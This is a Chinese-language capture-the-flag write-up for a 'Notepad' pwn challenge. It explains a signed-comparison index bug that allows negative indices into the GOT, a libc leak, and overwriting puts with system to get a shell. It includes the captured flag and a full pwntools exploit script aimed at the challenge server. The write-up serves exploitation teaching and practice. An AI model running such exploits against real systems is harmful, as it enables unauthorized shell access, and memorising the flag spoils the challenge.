# Notepad WP

## 漏洞

`get_note()` 中索引检查用的是有符号比较 `jle`，允许传入负数索引。

```c
if (idx > 9) exit(-1);  // 有符号比较，负数能绕过
```

notes 数组在 BSS 的 `0x35a0`，GOT 表在它前面。负数索引就能读写 GOT 表。

## GOT 布局

```
idx=-4: notes - 0xC0 = 0x34e0  → printf@GOT (泄露用)
idx=-5: notes - 0xF0 = 0x34b0  → content+0x10 = 0x34d0 = puts@GOT (覆写用)
```

## 利用步骤

1. **创建笔记 0**：title = `"sh"`（目标 libc 的 system 只允许 sh 或 /bin/sh）
2. **泄露 libc**：`view_note(-4)` 读出 printf@GOT 的真实地址，计算 libc 基址
3. **覆写 GOT**：`create_note(-5)` 把 puts@GOT 写成 system 地址
4. **getshell**：`view_note(0)` → puts(title) 变成 system("sh") → 拿到 shell
5. 执行 `cat flag*` 读 flag

## Flag

`ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}`

## Exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '39.96.193.120'
PORT = 10005

elf = ELF('./unpacked/notepad')
libc = ELF('./unpacked/libc.so.6')

def create_note(p, idx, title, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Name: ', title)
    p.sendafter(b'Content: ', content)

def view_note(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def exploit():
    p = remote(HOST, PORT)

    create_note(p, 0, b'sh\x00' + b'\x00' * 13, b'\x00' * 4)

    view_note(p, -4)

    p.recvuntil(b'Name: ')
    leak_printf_raw = p.recvline().strip()
    leak_printf = u64(leak_printf_raw.ljust(8, b'\x00'))
    log.success(f'Leaked printf: {hex(leak_printf)}')

    p.recvuntil(b'Content: ')
    leak_read_raw = p.recvline().strip()
    leak_read = u64(leak_read_raw.ljust(8, b'\x00'))
    log.success(f'Leaked read: {hex(leak_read)}')

    libc_base = leak_printf - libc.symbols['printf']
    system_addr = libc_base + libc.symbols['system']
    log.success(f'libc base: {hex(libc_base)}')
    log.success(f'system: {hex(system_addr)}')

    payload = b'\x00' * 16 + p64(system_addr) + b'\x00' * 8
    create_note(p, -5, b'\x00' * 16, payload)

    log.info('Triggering system("sh")...')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', b'0')

    sleep(0.3)
    p.sendline(b'cat flag*')
    p.sendline(b'cat /flag*')
    p.sendline(b'id')
    p.sendline(b'ls -la')

    p.interactive()

if __name__ == '__main__':
    exploit()
```